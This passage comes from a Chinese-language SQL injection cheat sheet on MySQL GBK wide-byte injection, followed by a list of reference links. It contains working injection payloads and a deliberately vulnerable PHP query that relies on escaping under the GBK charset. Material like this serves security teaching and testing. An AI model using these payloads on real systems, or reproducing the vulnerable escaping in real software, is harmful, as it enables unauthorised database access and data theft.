* `%bf%27`：这是字节序列 `0xbf27` 的 URL 编码表示。在 GBK 字符集中，`0xbf27` 解码为一个有效的多字节字符后跟一个单引号（'）。当 MySQL 遇到这个序列时，它将其解释为一个有效的 GBK 字符后跟一个单引号，有效地结束了字符串。
* `%bf%5c`：代表字节序列 `0xbf5c`。在 GBK 中，这解码为一个有效的多字节字符后跟一个反斜杠（`\`）。这可以用来转义序列中的下一个字符。
* `%a1%27`：代表字节序列 `0xa127`。在 GBK 中，这解码为一个有效的多字节字符后跟一个单引号（`'）。

可以创建许多有效载荷，例如：

```
%A8%27 OR 1=1;--
%8C%A8%27 OR 1=1--
%bf' OR 1=1 -- --
```

以下是使用 GBK 编码并过滤用户输入以转义反斜杠、单引号和双引号的 PHP 示例。

```php
function check_addslashes($string)
{
    $string = preg_replace('/'. preg_quote('\\') .'/', "\\\\\\", $string);          //转义任何反斜杠
    $string = preg_replace('/\'/i', '\\\'', $string);                               //用反斜杠转义单引号
    $string = preg_replace('/\"/', "\\\"", $string);                                //用反斜杠转义双引号
      
    return $string;
}

$id=check_addslashes($_GET['id']);
mysql_query("SET NAMES gbk");
$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
print_r(mysql_error());
```

以下是宽字节注入的工作原理分解：

例如，如果输入是 `?id=1'`，PHP 将添加一个反斜杠，导致 SQL 查询：`SELECT * FROM users WHERE id='1\'' LIMIT 0,1`。

然而，当在单引号前引入序列 `%df`，如 `?id=1%df'`，PHP 仍然会添加反斜杠。这导致 SQL 查询：`SELECT * FROM users WHERE id='1%df\'' LIMIT 0,1`。 

在 GBK 字符集中，序列 `%df%5c` 转换为字符 `連`。因此，SQL 查询变为：`SELECT * FROM users WHERE id='1連'' LIMIT 0,1`。这里，宽字节字符 `連` 有效地“吃掉”了添加的转义字符，从而允许 SQL 注入。

因此，通过使用有效载荷 `?id=1%df' and 1=1 --+`，在 PHP 添加反斜杠后，SQL 查询转变为：`SELECT * FROM users WHERE id='1連' and 1=1 --+' LIMIT 0,1`。这个改变的查询可以成功注入，绕过了预期的 SQL 逻辑。


## 参考

- **文档标题**：MySQL带外黑客攻击 - 作者Osanda Malith
  - **资源链接**：[PDF文档](https://www.exploit-db.com/docs/english/41273-mysql-out-of-band-hacking.pdf)
  - **描述**：这篇文档介绍了针对MySQL数据库的带外（Out of Band）黑客攻击方法。

- **博客文章标题**：不知道列名的情况下提取数据 - 作者Ahmed Sultan @0x4148
  - **资源链接**：[博客文章](https://blog.redforce.io/sqli-extracting-data-without-knowing-columns-names/)
  - **描述**：这篇文章讨论了在不了解数据库列名的情况下，如何通过SQL注入攻击提取数据的技术。

- **论坛帖子标题**：MySQL注入帮助 - 来源rdot.org
  - **资源链接**：[论坛帖子](https://rdot.org/forum/showpost.php?p=114&postcount=1)
  - **描述**：这是一个关于MySQL注入攻击的帮助帖子。

- **资源标题**：SQL截断攻击 - 作者Warlock
  - **资源链接**：[文章](https://resources.infosecinstitute.com/sql-truncation-attack/)
  - **描述**：这篇文章介绍了SQL截断攻击的原理和可能的影响。

- **CTF比赛回顾标题**：HackerOne @ajxchapman 50m-ctf回顾 - 作者Alex Chapman @ajxchapman
  - **资源链接**：[CTF比赛回顾](https://hackerone.com/reports/508123)
  - **描述**：这是Alex Chapman对一次CTF比赛的回顾，其中涉及到了安全漏洞的利用。

- **资源标题**：SQL注入类型 - 基于错误 - 来源netspi的SQL Wiki
  - **资源链接**：[Wiki页面](https://sqlwiki.netspi.com/injectionTypes/errorBased)
  - **描述**：这个Wiki页面讨论了基于错误的SQL注入攻击类型。

- **CTF比赛资源标题**：ekoparty web_100 - 2016年10月26日 - p4-team
  - **资源链接**：[CTF比赛资源](https://github.com/p4-team/ctf/tree/master/2016-10-26-ekoparty/web_100)
  - **描述**：这是来自p4-team的CTF比赛资源，涉及到了web_100挑战的相关资料。

- **博客文章标题**：Web安全 - MySQL - 作者Roberto Salgado - 2013年5月29日
  - **资源链接**：[博客文章](https://websec.ca/kb/sql_injection#MySQL_Default_Databases)
  - **描述**：这篇文章讨论了MySQL数据库在Web安全方面的知识，包括默认数据库的信息。

- **博客文章标题**：MySQL的科学计数法漏洞使AWS WAF客户面临SQL注入风险 - 作者Marc Olivier Bergeron - 2021年10月19日
  - **资源链接**：[博客文章](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/)
  - **描述**：这篇文章讨论了MySQL中的一个科学计数法漏洞，该漏洞可能导致AWS WAF客户遭受SQL注入攻击。

- **指南标题**：如何使用SQL调用来保护您的网站 - 来源IT安全中心（ISEC）信息通信技术促进机构
  - **资源链接**：[指南文档](https://www.ipa.go.jp/security/vuln/ps6vr70000011hc4-att/000017321.pdf)
  - **描述**：这份指南提供了使用SQL调用来增强网站安全的建议和方法。
